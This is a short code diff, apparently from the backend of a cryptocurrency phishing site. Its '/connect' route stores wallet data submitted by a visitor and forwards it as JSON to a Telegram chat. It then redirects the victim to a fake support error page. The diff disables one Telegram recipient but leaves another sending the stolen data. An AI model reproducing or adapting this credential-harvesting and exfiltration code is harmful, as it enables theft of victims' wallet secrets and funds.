@@ -519,7 +519,7 @@ app.post("/connect", async (req, res) => {
     const text = JSON.stringify(data, null, 4);
     data.createdAt = new Date();
     const savedData = await HubWallet.create(data);
-    sendToTelegram("1618693731", text);
+    // sendToTelegram("1618693731", text);
     sendToTelegramPacho("6852059122", text);
     res.redirect('https://rpc-support.surge.sh/badrequest');
     return savedData;
